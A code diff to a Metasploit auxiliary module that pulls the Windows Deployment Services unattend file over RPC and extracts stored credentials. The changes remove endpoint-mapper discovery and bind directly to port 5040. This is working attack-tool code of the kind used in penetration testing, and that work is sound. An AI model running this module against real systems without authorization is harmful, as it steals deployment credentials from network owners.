@@ -27,7 +27,8 @@ class Metasploit3 < Msf::Auxiliary
 			'Name'           => 'Microsoft Windows Deployment Services Unattend Retrieval',
 			'Description'    => %q{
 						This module retrieves the client unattend file from Windows
-						Deployment Services RPC service and parses out the stored credentials
+						Deployment Services RPC service and parses out the stored credentials.
+						Tested against Windows 2008 R2
 			},
 			'Author'         => [ 'Ben Campbell <eat_meatballs[at]hotmail.co.uk>' ],
 			'License'        => MSF_LICENSE,
@@ -41,8 +42,7 @@ class Metasploit3 < Msf::Auxiliary
 
 		register_options(
 			[
-				Opt::RPORT(135),
-				OptPort.new('WDS_PORT', [true, "Windows Deployment Services Port", 5040])
+				Opt::RPORT(5040),
 			], self.class)
 		
 		deregister_options('RHOST', 'CHOST', 'CPORT', 'SSL', 'SSLVersion')
@@ -53,36 +53,9 @@ class Metasploit3 < Msf::Auxiliary
 			], self.class)	
 	end
 	
-	# Obtain information about a single host
 	def run_host(ip)
 			begin
-					ids = dcerpc_endpoint_list
-					return if not ids
-					name = nil
-					ids.each do |id|
-							next if not id[:prot]
-							if id[:uuid].upcase == Rex::Proto::DCERPC::WDSCP::Constants::WDSCP_RPC_UUID
-									line = "#{id[:uuid]} v#{id[:vers]} "
-									line << "#{id[:prot].upcase} "
-									line << "(#{id[:port]}) " if id[:port]
-									line << "(#{id[:pipe]}) " if id[:pipe]
-									line << "#{id[:host]} " if id[:host]
-									line << "[#{id[:note]}]" if id[:note]
-
-									print_good("Windows Deployment Services found: %s" %line)
-
-									report_service(
-											:host => ip,
-											:port => id[:port],
-											:proto => id[:prot].downcase,
-											:name => "dcerpc",
-											:info => "#{id[:uuid]} v#{id[:vers]} Windows Deployment Services"
-									)
-									
-									query_host(ip)
-							end
-					end
-
+				query_host(ip)
 			rescue ::Interrupt
 					raise $!
 			rescue ::Rex::Proto::DCERPC::Exceptions::Fault
@@ -97,16 +70,19 @@ class Metasploit3 < Msf::Auxiliary
 		self.handle = Rex::Proto::DCERPC::Handle.new(	[WDS_CONST::WDSCP_RPC_UUID, '1.0','71710533-beba-4937-8319-b5dbef9ccc36', 1],
 														'ncacn_ip_tcp', 
 														rhost, 
-														[datastore['WDS_PORT']])
+														[datastore['RPORT']])
 		
 		print_status("Binding to #{handle} ...")
-		begin
-			self.dcerpc = Rex::Proto::DCERPC::Client.new(self.handle, self.sock)
-			vprint_status("Bound to #{handle}")
-			rescue
-				print_error("Unable to bind")
-				return
-		end
+
+		self.dcerpc = Rex::Proto::DCERPC::Client.new(self.handle, self.sock)
+		print_good("Bound to #{handle}")
+		report_service(
+				:host => rhost,
+				:port => datastore['RPORT'],
+				:proto => 'tcp',
+				:name => "dcerpc",
+				:info => "#{WDS_CONST::WDSCP_RPC_UUID} v1.0 Windows Deployment Services"
+		)
 		
 		table = Rex::Ui::Text::Table.new({
                         'Header' => 'WindowsDeploymentServices',
